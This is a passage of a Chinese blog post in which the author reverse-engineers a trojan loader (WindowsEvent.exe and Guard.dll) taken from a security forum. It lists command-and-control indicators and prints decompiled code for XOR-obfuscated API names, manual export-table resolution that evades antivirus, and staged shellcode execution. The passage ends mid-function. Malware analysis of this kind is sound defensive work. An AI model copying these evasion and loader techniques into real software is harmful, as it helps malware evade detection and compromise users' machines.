<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <meta name="description" content="样本：https://www.52pojie.cn/forum.php?mod=viewthread&amp;amp;tid=2063618&amp;amp;page=1&amp;amp;extra=#pid53963559原帖：https://www.52pojie.cn//thread-2063616-1-1.html" />
  

  
  
  
  
  
  
  <title>跟着52pojie大佬分析一份木马样本 | shanza&#39;s hideout</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="样本：https:&#x2F;&#x2F;www.52pojie.cn&#x2F;forum.php?mod&#x3D;viewthread&amp;tid&#x3D;2063618&amp;page&#x3D;1&amp;extra&#x3D;#pid53963559原帖：https:&#x2F;&#x2F;www.52pojie.cn&#x2F;&#x2F;thread-2063616-1-1.html分析：https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-2075186-1-1.html">
<meta property="og:type" content="article">
<meta property="og:title" content="跟着52pojie大佬分析一份木马样本">
<meta property="og:url" content="https://shanzade.github.io/2025/12/07/%E8%B7%9F%E7%9D%8052pojie%E5%A4%A7%E4%BD%AC%E5%88%86%E6%9E%90%E4%B8%80%E4%BB%BD%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC/index.html">
<meta property="og:site_name" content="shanza&#39;s hideout">
<meta property="og:description" content="样本：https:&#x2F;&#x2F;www.52pojie.cn&#x2F;forum.php?mod&#x3D;viewthread&amp;tid&#x3D;2063618&amp;page&#x3D;1&amp;extra&#x3D;#pid53963559原帖：https:&#x2F;&#x2F;www.52pojie.cn&#x2F;&#x2F;thread-2063616-1-1.html分析：https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-2075186-1-1.html">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-12-07T15:58:36.000Z">
<meta property="article:modified_time" content="2025-12-12T05:03:30.885Z">
<meta property="article:author" content="shanza">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/css/images/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  

  
  <!-- baidu webmaster push -->
  <!-- <script src='//push.zhanzhang.baidu.com/push.js'></script> -->
<meta name="generator" content="Hexo 7.3.0"></head>
<body class="home blog custom-background custom-font-enabled single-author">
  <div id="page" class="hfeed site">
      <header id="masthead" class="site-header" role="banner">
    <hgroup>
      <h1 class="site-title">
        <a href="/" title="shanza&#39;s hideout" rel="home">shanza&#39;s hideout</a>
      </h1>
      
        <h2 class="site-description hitokoto">为君聊赋今日诗，努力请从今日始。</h2>
        <!-- <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script> -->
      
    </hgroup>

    <nav id="site-navigation" class="main-navigation" role="navigation">
            <button class="menu-toggle">菜单</button>
            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
            <div class="menu-main-container">
                <ul id="menu-main" class="nav-menu">
                
                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
                
                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
                
                </ul>
            </div>
    </nav>
</header>

      <div id="main" class="wrapper">
        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-跟着52pojie大佬分析一份木马样本" class="post-跟着52pojie大佬分析一份木马样本 post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title article-title">
      跟着52pojie大佬分析一份木马样本
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="https://shanzade.github.io/2025/12/07/%E8%B7%9F%E7%9D%8052pojie%E5%A4%A7%E4%BD%AC%E5%88%86%E6%9E%90%E4%B8%80%E4%BB%BD%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC/" data-id="cmj2ejn230005lsvggt0o4uve" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <blockquote>
<p>样本：<br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=2063618&page=1&extra=#pid53963559">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=2063618&amp;page=1&amp;extra=#pid53963559</a><br>原帖：<br><a target="_blank" rel="noopener" href="https://www.52pojie.cn//thread-2063616-1-1.html">https://www.52pojie.cn//thread-2063616-1-1.html</a><br>分析：<br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-2075186-1-1.html">https://www.52pojie.cn/thread-2075186-1-1.html</a></p>
</blockquote>
<h2 id="查壳——基本分析"><a href="#查壳——基本分析" class="headerlink" title="查壳——基本分析"></a>查壳——基本分析</h2><h3 id="WindowsEvent-exe"><a href="#WindowsEvent-exe" class="headerlink" title="WindowsEvent.exe"></a>WindowsEvent.exe</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Image is 32bit executable</span><br><span class="line">*Unknown exe , EP : 56 E8 .. , 02 sections  [ Linker 14.00 ]  Std Compiler section  or Asm demo/example (2025-08-04) [ Win Vista ][ No Import ] </span><br></pre></td></tr></table></figure>
<p>仅有 2 个段，<code>.text</code> 和 <code>.reloc</code></p>
<h3 id="Guard-dll"><a href="#Guard-dll" class="headerlink" title="Guard.dll"></a>Guard.dll</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DLL 32 bit-Library image</span><br><span class="line">Microsoft Visual C++ v.7.10 DLL (55 8B) - 14.44 - Visual Studio 20xx  [ Win Vista ] [Debug 13]  2025-08-26</span><br></pre></td></tr></table></figure>
<p>有 5 个段，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.rdata</span><br><span class="line">.data</span><br><span class="line">.fptable</span><br><span class="line">.reloc</span><br></pre></td></tr></table></figure>
<h2 id="在线沙箱分析"><a href="#在线沙箱分析" class="headerlink" title="在线沙箱分析"></a>在线沙箱分析</h2><p><a target="_blank" rel="noopener" href="https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&id=AZrkvUKiSZq0HOVf1e4d">https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&amp;id=AZrkvUKiSZq0HOVf1e4d</a><br><a target="_blank" rel="noopener" href="https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&id=93e8ec6b05c7c8ba86acc542d9f5e9756ded3fbe">https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&amp;id=93e8ec6b05c7c8ba86acc542d9f5e9756ded3fbe</a><br><code>agentb</code>, <code>silverfox</code></p>
<h3 id="dll-调用情况"><a href="#dll-调用情况" class="headerlink" title="dll 调用情况"></a>dll 调用情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\apphelp.dll</span><br><span class="line">C:\Windows\System32\mswsock.dll</span><br><span class="line">C:\Windows\System32\rasadhlp.dll</span><br><span class="line">ntdll</span><br><span class="line">KERNEL32.DLL</span><br><span class="line">C:\Windows\system32\mswsock.dll</span><br><span class="line">rpcrt4.dll</span><br><span class="line">ntdll.dll</span><br><span class="line">Ws2_32.dll</span><br><span class="line">C:\Windows\System32\fwpuclnt.dll</span><br></pre></td></tr></table></figure>
<h3 id="网络通信记录"><a href="#网络通信记录" class="headerlink" title="网络通信记录"></a>网络通信记录</h3><p>因为确实调用到了 <code>Ws2_32.dll</code>，所以可以猜测有上传数据或 c2 连接。（？）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">156.234.119.138:80</span><br><span class="line">156.234.119.138:443</span><br><span class="line">syumineyt.top</span><br></pre></td></tr></table></figure>

<h2 id="WindowsEvent-exe-1"><a href="#WindowsEvent-exe-1" class="headerlink" title="WindowsEvent.exe"></a>WindowsEvent.exe</h2><p>没有字符串内容，没有函数名（stripped）<br>因为是近期的病毒，感觉面向群体都是 win10 及以上的用户，正好没有配置 win10 的环境，也没有办法动调了，沙箱的 win7 检测也没有任何结果。</p>
<h3 id="start"><a href="#start" class="headerlink" title="start()"></a><code>start()</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !sub_4002F5() )                          <span class="comment">// 初始化——获取 kernel32 函数地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_4004B8() )                           <span class="comment">// 文件路径处理判断</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_400593();                               <span class="comment">// 计划任务</span></span><br><span class="line">    sub_400660();                               <span class="comment">// 解密 &amp; 执行 shellcode</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sub-4002f5——初始化"><a href="#sub-4002f5——初始化" class="headerlink" title="sub_4002f5——初始化"></a><code>sub_4002f5</code>——初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write access to const memory has been detected, the output may be wrong!</span></span><br><span class="line">BOOL <span class="title function_">sub_4002F5</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> handle0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> handle1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> lpszReadFile[<span class="number">9</span>]; <span class="comment">// [esp+3h] [ebp-81h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszVirtualFree[<span class="number">12</span>]; <span class="comment">// [esp+Ch] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszVirtualAlloc[<span class="number">13</span>]; <span class="comment">// [esp+18h] [ebp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszCreateProcessA[<span class="number">15</span>]; <span class="comment">// [esp+25h] [ebp-5Fh] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszVirtualProtect[<span class="number">15</span>]; <span class="comment">// [esp+34h] [ebp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszGetFileSize[<span class="number">12</span>]; <span class="comment">// [esp+43h] [ebp-41h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszCloseHandle[<span class="number">12</span>]; <span class="comment">// [esp+4Fh] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszCreateFileA[<span class="number">12</span>]; <span class="comment">// [esp+5Bh] [ebp-29h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszKernel32[<span class="number">29</span>]; <span class="comment">// [esp+67h] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  xor_6ah_400488(lpszKernel32, sub_4009E0);     <span class="comment">// kernel32.dll</span></span><br><span class="line">  xor_6ah_400488(lpszCreateFileA, (_BYTE *)&amp;loc_4009ED + <span class="number">1</span>);<span class="comment">// CreateFileA</span></span><br><span class="line">  xor_6ah_400488(lpszCloseHandle, &amp;byte_4009FB);<span class="comment">// CloseHandle</span></span><br><span class="line">  xor_6ah_400488(lpszGetFileSize, dword_400A08);<span class="comment">// GetFileSize</span></span><br><span class="line">  xor_6ah_400488(lpszVirtualAlloc, byte_400A15);<span class="comment">// VirtualAlloc</span></span><br><span class="line">  xor_6ah_400488(lpszVirtualFree, &amp;byte_400A23);<span class="comment">// VirtualFree</span></span><br><span class="line">  xor_6ah_400488(lpszReadFile, sub_400A30);     <span class="comment">// ReadFile</span></span><br><span class="line">  xor_6ah_400488(lpszVirtualProtect, sub_400A3A);<span class="comment">// VirtualProtect</span></span><br><span class="line">  xor_6ah_400488(lpszCreateProcessA, &amp;loc_400A5E);<span class="comment">// CreateProcessA</span></span><br><span class="line">  handle0 = loadlibrary_400200(lpszKernel32);   <span class="comment">// 200 加载 / 读取 dll（kernel32.dll）</span></span><br><span class="line">  <span class="keyword">if</span> ( !handle0 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  handle1 = handle0;</span><br><span class="line">  pFnCreateFileA = (<span class="type">int</span> *)getprocaddress_400271(handle0, (<span class="type">int</span>)lpszCreateFileA);<span class="comment">// 271 根据函数字符串，从句柄或文件中获取函数地址</span></span><br><span class="line">  pFnCloseHandle = (<span class="type">int</span> *)getprocaddress_400271(handle1, (<span class="type">int</span>)lpszCloseHandle);</span><br><span class="line">  pFnGetFileSize = (<span class="type">int</span> *)getprocaddress_400271(handle1, (<span class="type">int</span>)lpszGetFileSize);</span><br><span class="line">  pFnVirtualAlloc = (<span class="type">int</span> *)getprocaddress_400271(handle1, (<span class="type">int</span>)lpszVirtualAlloc);</span><br><span class="line">  pFnVirtualFree = (<span class="type">int</span> (__stdcall *)(_DWORD, _DWORD, _DWORD))getprocaddress_400271(handle1, (<span class="type">int</span>)lpszVirtualFree);</span><br><span class="line">  pFnReadFile = (<span class="type">int</span> *)getprocaddress_400271(handle1, (<span class="type">int</span>)lpszReadFile);</span><br><span class="line">  pFnVirtualProtect = (<span class="type">int</span> *)getprocaddress_400271(handle1, (<span class="type">int</span>)lpszVirtualProtect);</span><br><span class="line">  pFnCreateProcessA_4009DC = getprocaddress_400271(handle1, (<span class="type">int</span>)lpszCreateProcessA);</span><br><span class="line">  <span class="keyword">return</span> _mm_movemask_epi8(</span><br><span class="line">           _mm_packs_epi32(</span><br><span class="line">             _mm_cmpeq_epi32((__m128i)<span class="number">0</span>i64, *(__m128i *)&amp;pFnCreateFileA),</span><br><span class="line">             _mm_cmpeq_epi32(</span><br><span class="line">               (__m128i)_mm_shuffle_ps(</span><br><span class="line">                          _mm_unpacklo_ps(</span><br><span class="line">                            (__m128)*(<span class="type">unsigned</span> __int64 *)&amp;pFnReadFile,</span><br><span class="line">                            (__m128)(<span class="type">unsigned</span> <span class="type">int</span>)pFnVirtualFree),</span><br><span class="line">                          _mm_shuffle_ps(</span><br><span class="line">                            (__m128)_mm_cvtsi32_si128(pFnCreateProcessA_4009DC),</span><br><span class="line">                            (__m128)*(<span class="type">unsigned</span> __int64 *)&amp;pFnReadFile,</span><br><span class="line">                            <span class="number">212</span>),</span><br><span class="line">                          <span class="number">33</span>),</span><br><span class="line">               (__m128i)<span class="number">0</span>i64))) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="xor-6ah-400488"><a href="#xor-6ah-400488" class="headerlink" title="xor_6ah_400488()"></a><code>xor_6ah_400488()</code></h4><p>对传入的数据异或 0x6a 解密，避免了函数名硬编码的静态分析风险。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">xor_400488</span><span class="params">(<span class="type">char</span> *arrays, _BYTE *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  result = arrays;</span><br><span class="line">  v3 = (<span class="type">unsigned</span> __int8)*a2;</span><br><span class="line">  <span class="keyword">if</span> ( *a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      arrays[v4] = a2[v4 + <span class="number">1</span>] ^ <span class="number">0x6A</span>;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 != v4 );</span><br><span class="line">  &#125;</span><br><span class="line">  arrays[v3] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="异或结果（手搓脚本）"><a href="#异或结果（手搓脚本）" class="headerlink" title="异或结果（手搓脚本）"></a>异或结果（手搓脚本）</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">dt = []</span><br><span class="line">dt.append([<span class="number">0x01</span>, <span class="number">0x0F</span>, <span class="number">0x18</span>, <span class="number">0x04</span>, <span class="number">0x0F</span>, <span class="number">0x06</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x44</span>, <span class="number">0x0E</span>, <span class="number">0x06</span>, <span class="number">0x06</span>])</span><br><span class="line">dt.append([<span class="number">0x29</span>, <span class="number">0x18</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x1e</span>, <span class="number">0xf</span>, <span class="number">0x2c</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0xf</span>, <span class="number">0x2b</span>])</span><br><span class="line">dt.append([<span class="number">0x29</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x19</span>, <span class="number">0x0F</span>, <span class="number">0x22</span>, <span class="number">0x0B</span>, <span class="number">0x04</span>, <span class="number">0x0E</span>, <span class="number">0x06</span>, <span class="number">0x0F</span>])</span><br><span class="line">dt.append([<span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0x2C</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x0F</span>, <span class="number">0x39</span>, <span class="number">0x03</span>, <span class="number">0x10</span>, <span class="number">0x0F</span>])</span><br><span class="line">dt.append([<span class="number">0x3C</span>, <span class="number">0x03</span>, <span class="number">0x18</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x09</span>])</span><br><span class="line">dt.append([<span class="number">0x3C</span>, <span class="number">0x03</span>, <span class="number">0x18</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x2C</span>, <span class="number">0x18</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>])</span><br><span class="line">dt.append([<span class="number">0x38</span>, <span class="number">0x0F</span>, <span class="number">0x0B</span>, <span class="number">0x0E</span>, <span class="number">0x2C</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x0F</span>])</span><br><span class="line">dt.append([<span class="number">0x3C</span>, <span class="number">0x03</span>, <span class="number">0x18</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x3A</span>, <span class="number">0x18</span>, <span class="number">0x05</span>, <span class="number">0x1E</span>, <span class="number">0x0F</span>, <span class="number">0x09</span>, <span class="number">0x1E</span>])</span><br><span class="line">dt.append([<span class="number">0x29</span>, <span class="number">0x18</span>, <span class="number">0x0F</span>, <span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x0F</span>, <span class="number">0x3A</span>, <span class="number">0x18</span>, <span class="number">0x05</span>, <span class="number">0x09</span>, <span class="number">0x0F</span>, <span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0x2B</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(dt):</span><br><span class="line">    dt[i] = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(k ^ <span class="number">0x6a</span>) <span class="keyword">for</span> k <span class="keyword">in</span> j])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dt:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">kernel32.dll</span></span><br><span class="line"><span class="string">CreateFileA</span></span><br><span class="line"><span class="string">CloseHandle</span></span><br><span class="line"><span class="string">GetFileSize</span></span><br><span class="line"><span class="string">VirtualAlloc</span></span><br><span class="line"><span class="string">VirtualFree</span></span><br><span class="line"><span class="string">ReadFile</span></span><br><span class="line"><span class="string">VirtualProtect</span></span><br><span class="line"><span class="string">CreateProcessA</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="getprocaddress-400271"><a href="#getprocaddress-400271" class="headerlink" title="getprocaddress_400271()"></a><code>getprocaddress_400271()</code></h4><p>分析 dll 的 pe 头找到 eat 导出表，再通过导出表找到需要的函数。<br>这里应该是规避了动态分析和检测，正常调用 <code>GetProcAddress()</code> 获取一些敏感的函数确实会被杀毒软件阻止。<br>这里需要注意的是，因为 exe 是 32 位的，所以查找的 <code>kernel32.dll</code> 应该是 <code>SysWOW64</code> 下的。<br>这边顺带也复习了一下 pe 头和导出表的相关内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_400271</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> lpszFuncName)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> dwPeHeaderOffset; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> dwExportVA; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;                                   <span class="comment">// 注意该 exe 为 32 位映像</span></span><br><span class="line">                                                <span class="comment">// 查找对应的 kernel32.dll 时应该查找 syswow64 下的 dll</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_WORD *)a1 == <span class="number">0x5A4D</span> )                 <span class="comment">// 4d 5a mz dos 头</span></span><br><span class="line">  &#123;</span><br><span class="line">    dwPeHeaderOffset = *(_DWORD *)(a1 + <span class="number">0x3C</span>);  <span class="comment">// 整数计算 a1 + 0x3c 为 pe nt 头的偏移位置</span></span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + dwPeHeaderOffset) == <span class="number">0x4550</span> )<span class="comment">// 50 45 00 00 PE (@ 0f8h)</span></span><br><span class="line">    &#123;</span><br><span class="line">      dwExportVA = *(_DWORD *)(a1 + dwPeHeaderOffset + <span class="number">0x78</span>);<span class="comment">// 0f8h + 78h = 170h 导出表 RVA</span></span><br><span class="line">      <span class="keyword">if</span> ( dwExportVA )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(a1 + dwExportVA + <span class="number">0x18</span>) )<span class="comment">// 运行时定位：@93ea0h</span></span><br><span class="line">                                                <span class="comment">// 文件定位：93ea0h - 80000h + 6d000h = @80ea0h</span></span><br><span class="line">                                                <span class="comment">// x + 0x18 = NumberOfNames</span></span><br><span class="line">        &#123;</span><br><span class="line">          v5 = a1 + *(_DWORD *)(a1 + dwExportVA + <span class="number">0x20</span>);<span class="comment">// AddressOfNames</span></span><br><span class="line">          v8 = a1 + *(_DWORD *)(a1 + dwExportVA + <span class="number">0x24</span>);<span class="comment">// AddressOfNameOrdinals</span></span><br><span class="line">          v7 = a1 + *(_DWORD *)(a1 + dwExportVA + <span class="number">0x1C</span>);<span class="comment">// AddressOfFunctions</span></span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( !sub_4006DC(a1 + *(_DWORD *)(v5 + <span class="number">4</span> * v6), lpszFuncName) )<span class="comment">// 遍历比较导出表与函数名</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)++v6 &gt;= *(_DWORD *)(a1 + dwExportVA + <span class="number">0x18</span>) )<span class="comment">// 没有查找到指定函数名</span></span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> *(_DWORD *)(v7 + <span class="number">4</span> * *(<span class="type">unsigned</span> __int16 *)(v8 + <span class="number">2</span> * v6)) + a1;<span class="comment">// 查找 ordinals 并返回对应函数地址</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sub-4004B8-——路径处理"><a href="#sub-4004B8-——路径处理" class="headerlink" title="sub_4004B8()——路径处理"></a><code>sub_4004B8()</code>——路径处理</h3><p>这部分没看太懂，静态分析还是不够的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 